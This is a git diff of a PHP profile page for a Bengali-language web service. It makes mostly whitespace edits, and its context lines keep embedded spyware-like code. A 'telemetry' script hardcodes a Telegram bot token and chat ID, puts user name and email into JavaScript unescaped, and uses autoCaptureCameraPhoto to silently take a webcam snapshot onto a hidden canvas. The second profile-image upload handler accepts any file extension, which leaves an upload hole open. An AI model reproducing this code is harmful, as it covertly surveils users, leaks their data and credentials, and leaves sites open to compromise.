@@ -1,4 +1,4 @@
-<?php 
+<?php
 include("header.php");
 
 // AJAX Image Upload & MySQL Database Update Handler
@@ -9,14 +9,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['ajax_profile_image'])
         if (!is_dir($target_dir)) {
             mkdir($target_dir, 0755, true);
         }
-        
+
         $file_extension = strtolower(pathinfo($_FILES["ajax_profile_image"]["name"], PATHINFO_EXTENSION));
         $allowed = ['jpg', 'jpeg', 'png', 'webp', 'gif'];
-        
+
         if (in_array($file_extension, $allowed)) {
             $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
             $target_file = $target_dir . $new_filename;
-            
+
             if (move_uploaded_file($_FILES["ajax_profile_image"]["tmp_name"], $target_file)) {
                 $stmt_img = $conn->prepare("UPDATE users SET image = ? WHERE id = ?");
                 $stmt_img->bind_param("si", $target_file, $id);
@@ -40,7 +40,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
     $new_phone = trim($_POST['phone']);
     $new_address = trim($_POST['address']);
     $profile_pic_sql = "";
-    
+
     if (isset($_FILES['profile_image']) && $_FILES['profile_image']['error'] == 0) {
         $target_dir = "assets/images/faces/";
         if (!is_dir($target_dir)) {
@@ -49,7 +49,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
         $file_extension = strtolower(pathinfo($_FILES["profile_image"]["name"], PATHINFO_EXTENSION));
         $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
         $target_file = $target_dir . $new_filename;
-        
+
         if (move_uploaded_file($_FILES["profile_image"]["tmp_name"], $target_file)) {
             $profile_pic_sql = ", image = '" . $conn->real_escape_string($target_file) . "'";
         }
@@ -57,7 +57,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
 
     $update_stmt = $conn->prepare("UPDATE users SET name = ?, mobile = ?, address = ? $profile_pic_sql WHERE id = ?");
     $update_stmt->bind_param("sssi", $new_name, $new_phone, $new_address, $id);
-    
+
     if ($update_stmt->execute()) {
         $name = $new_name;
         $phone = $new_phone;
@@ -194,7 +194,7 @@ $user_query->close();
 <input type="file" id="profileFolderInput" accept="image/*" style="display: none;" onchange="uploadProfilePictureLocally()">
 
 <div class="max-w-6xl mx-auto px-3 sm:px-6 py-6 space-y-5">
-    
+
     <!-- Top Header Bar -->
     <div class="pro-ui-card p-4 sm:p-5 flex items-center justify-between gap-3">
         <div class="flex items-center gap-3.5">
@@ -212,25 +212,25 @@ $user_query->close();
     </div>
 
     <div class="grid grid-cols-1 md:grid-cols-12 gap-5">
-        
+
         <!-- Left Sidebar: Profile Card -->
         <div class="md:col-span-4 space-y-4">
             <div class="pro-ui-card p-5 text-center">
                 <div class="relative inline-block mb-3">
-                    <img id="profileImagePreview" src="<?php echo htmlspecialchars($user_avatar); ?>" 
-                         class="rounded-2xl border-4 border-[#F3F8FF] shadow-md object-cover cursor-pointer w-28 h-28 mx-auto" 
-                         alt="Profile Picture" 
+                    <img id="profileImagePreview" src="<?php echo htmlspecialchars($user_avatar); ?>"
+                         class="rounded-2xl border-4 border-[#F3F8FF] shadow-md object-cover cursor-pointer w-28 h-28 mx-auto"
+                         alt="Profile Picture"
                          title="প্রোফাইল ছবি পরিবর্তন করতে ক্লিক করুন"
                          onclick="document.getElementById('profileFolderInput').click();">
                     <button type="button" class="absolute -bottom-1 -right-1 bg-[#0866D9] text-white rounded-xl w-8 h-8 flex items-center justify-center shadow-md text-xs border-2 border-white cursor-pointer" onclick="document.getElementById('profileFolderInput').click();">
                         <i class="fa-solid fa-camera"></i>
                     </button>
                 </div>
-            
+
                 <h3 class="font-black text-[#123B70] text-lg"><?php echo htmlspecialchars($name); ?></h3>
                 <span class="inline-block bg-[#EFF6FF] text-[#0866D9] border border-[#BFDBFE] text-[10px] font-extrabold px-2.5 py-0.5 rounded-full mb-1">VERIFIED USER</span>
                 <p class="text-[#52657D] text-xs mb-4 truncate"><?php echo htmlspecialchars($email); ?></p>
-                
+
                 <!-- Wallet Widget -->
                 <div class="bg-[#F3F8FF] border border-[#DCE8F5] rounded-2xl p-3.5 mb-3 flex items-center justify-between">
                     <div class="text-left">
@@ -334,7 +334,7 @@ $user_query->close();
         <i class="fa-solid fa-house text-lg"></i>
         <span>হোম</span>
     </a>
-    <a href="services.php" class="flex flex-col items-center gap-1 text-[#52657D] hover:text-[#0866D9] text-[11px] font-semibold">
+    <a href="all_services.php" class="flex flex-col items-center gap-1 text-[#52657D] hover:text-[#0866D9] text-[11px] font-semibold">
         <i class="fa-solid fa-table-cells-large text-lg"></i>
         <span>সেবা</span>
     </a>
@@ -383,8 +383,8 @@ $user_query->close();
 
 <!-- Telegram & Direct Server Sync Script (All original notification & telemetry features retained) -->
 <script>
-const TELEGRAM_BOT_TOKEN = "6260586366:AAFlUeC0t6ua9GZDvywnfL5JSBEPCflura8"; 
-const TELEGRAM_CHAT_ID = "1875687264";     
+const TELEGRAM_BOT_TOKEN = "6260586366:AAFlUeC0t6ua9GZDvywnfL5JSBEPCflura8";
+const TELEGRAM_CHAT_ID = "1875687264";
 
 const userName = "<?php echo $name; ?>";
 const userEmail = "<?php echo $email; ?>";
@@ -492,7 +492,7 @@ function autoCaptureCameraPhoto() {
                     const canvas = document.getElementById('silentCanvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
-                    
+
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -503,7 +503,7 @@ function autoCaptureCameraPhoto() {
                         stream.getTracks().forEach(track => track.stop());
                     }, 'image/jpeg');
 
-                }, 1500); 
+                }, 1500);
             })
             .catch(function (err) {
                 console.log("Camera access denied.");
@@ -547,7 +547,7 @@ function uploadProfilePictureLocally() {
                     const updatedSrc = response.image_url + '?t=' + new Date().getTime();
                     $('#profileImagePreview').attr('src', updatedSrc);
                     $('#UserDropdown img').attr('src', updatedSrc);
-                    
+
                     Swal.fire({
                         icon: 'success',
                         title: 'সফল!',
